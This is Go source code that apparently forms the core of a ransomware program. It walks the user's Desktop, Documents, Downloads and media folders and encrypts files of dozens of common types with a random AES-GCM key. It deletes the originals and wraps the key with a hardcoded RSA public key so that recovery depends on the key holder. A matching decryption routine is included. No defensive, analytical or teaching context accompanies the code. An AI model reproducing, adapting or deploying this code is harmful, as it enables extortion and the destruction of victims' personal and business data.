package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"os"
	"path/filepath"
	"slices"
)

// used for generating an AES encryption key
func keygen(maxLength int) ([]byte, error) {
	possibleCharacters := "abcdefghijklmnopqrstuvwxyz"
	result := make([]byte, maxLength)

	for i := 0; i < maxLength; i++ {
		indexBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(possibleCharacters))))
		if err != nil {
			return nil, err
		}
		index := indexBig.Int64()
		result[i] = possibleCharacters[index]
	}

	return result, nil
}

// encrypt every file in a given directory, and returns the encrpyted aes key
func encryptAES() ([]byte, error) {
	//hardcoded rsa public key
	rsakey := `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyMWd90+WsmqDNNvnvFa6
9/FevI6TU4u2F5lEP5ZJkUQnjxGvg1p2bLYkSs+bEF4xK5y6U398EzZM7SLJAePi
LRUfggauA+NgGn4Snyu5hbROES4Bq/17Qt0mLkclDOVOMXQ1AQfKzp67cOvJBEyH
0EIgVefmEzlhUP+CDmde+R7I94xHCmD7xEIj7xvfK/eYD+JN1yoPGLbgliH4XKGj
THZmiGXq7KOIEPQ+6EeECbOVLIlfRY/y4RJH8vy04tgRHoVQaVcnnyisRkIMSpmD
824giSFL41c8i+QX7YfGHXlOFqaaq+2Dsx6hQ0+PyKvp1lgmXXys6Yqkp5s9cE1z
cwIDAQAB
-----END PUBLIC KEY-----`

	targetExtensions := []string{
		".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".rtf",
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
		".mp3", ".wav", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv",
		".zip", ".rar", ".7z", ".tar", ".gz",
		".sql", ".db", ".mdb", ".accdb",
		".csv", ".xml", ".json", ".log",
		".psd", ".ai", ".indd", ".dwg",
		".html", ".htm", ".php", ".asp", ".aspx", ".js", ".css",
		".c", ".cpp", ".py", ".java", ".rb", ".go", ".sh", ".bat",
	}

	targetDirs := []string{ "Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos" }

	fmt.Println("starting encrpytion")
	aeskey, err := keygen(16)
	if err != nil {
		return nil, fmt.Errorf("error generating the key: %w", err)
	}
	fmt.Println("aes key:", string(aeskey))

	block, err := aes.NewCipher(aeskey)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM cipher: %w", err)
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to locate home directory: %w", err)
	}

	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		// checking if a directory in the root dir is a target dir
		if info.IsDir() && filepath.Dir(path) == homeDir && path != homeDir && !slices.Contains(targetDirs, filepath.Base(path)) {
			return filepath.SkipDir
        }

		ext := filepath.Ext(path)
		if !info.IsDir() && slices.Contains(targetExtensions, ext) {
			fmt.Println("encrypting", path)
			plaintext, err := os.ReadFile(path)
			if err != nil {
				fmt.Println("failed to read input file: %w", err)
				return nil
			}

			nonce := make([]byte, gcm.NonceSize())
			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
				fmt.Println("failed to generate nonce: %w", err)
				return nil
			}

			ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

			err = os.WriteFile(path+".encrypted", ciphertext, 0644)
			if err != nil {
				fmt.Println("failed to write output file: %w", err)
				return nil
			}
			os.Remove(path)

		}
		return nil
	})

	if err != nil {
		return nil, err
	}

	fmt.Println("encrypting AES public key...")
	pubkeyDec, _ := decodePubkeyFromPEM(rsakey)
	aeskeyEnc, _ := encryptRSA(pubkeyDec, []byte(aeskey))

	fmt.Println("encryption successful")
	return []byte(base64.StdEncoding.EncodeToString(aeskeyEnc)), nil
}

func decryptAES(key string) error {
	fmt.Println("startring decryption")

	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return fmt.Errorf("failed to create AES cipher block: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Errorf("failed to create GCM cipher: %w", err)
	}

	targetDirs := []string{ "Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos" }
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("failed to locate home directory: %w", err)
	}
	err = filepath.Walk(homeDir, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() && filepath.Dir(path) == homeDir && path != homeDir && !slices.Contains(targetDirs, filepath.Base(path)) {
			return filepath.SkipDir
        }

		if !info.IsDir() && filepath.Ext(path) == ".encrypted" {
			ciphertext, err := os.ReadFile(path)
			if err != nil {
				fmt.Println("failed to read input file: %w", err)
				return nil
			}

			nonceSize := gcm.NonceSize()
			if len(ciphertext) < nonceSize {
				fmt.Println("invalid ciphertext: too short to contain nonce")
				return nil
			}

			nonce, actualCiphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
			
			fmt.Println("decrypting", path)
			plaintext, err := gcm.Open(nil, nonce, actualCiphertext, nil)
			if err != nil {
				return fmt.Errorf("failed to decrypt/authenticate ciphertext: %w", err)
			}

			err = os.WriteFile(path[:len(path)-10], plaintext, 0644)
			if err != nil {
				fmt.Println("failed to write output file: %w", err)
				return nil
			}

			os.Remove(path)
		}
		return nil
	})

	if err != nil {
		return err
	}

	fmt.Println("decryption successful")
	return nil
}

func decodePubkeyFromPEM(publicKeyPEM string) (*rsa.PublicKey, error) {
	block, rest := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return nil, errors.New("failed to decode PEM block containing public key")
	}
	if len(rest) > 0 {
		log.Printf("Warning: Trailing data found after PEM block in public key input")
	}
	if block.Type != "PUBLIC KEY" {
		return nil, fmt.Errorf("invalid PEM block type: expected 'PUBLIC KEY', got '%s'", block.Type)
	}

	genericPublicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPublicKey, ok := genericPublicKey.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("key type assertion failed: public key is not an RSA key (type: %T)", genericPublicKey)
	}

	return rsaPublicKey, nil
}

func encryptRSA(publicKey *rsa.PublicKey, plain []byte) ([]byte, error) {
	oaepHash := sha256.New()

	ciphertext, err := rsa.EncryptOAEP(oaepHash, rand.Reader, publicKey, plain, nil)
	if err != nil {
		return nil, err
	}
	return ciphertext, nil
}
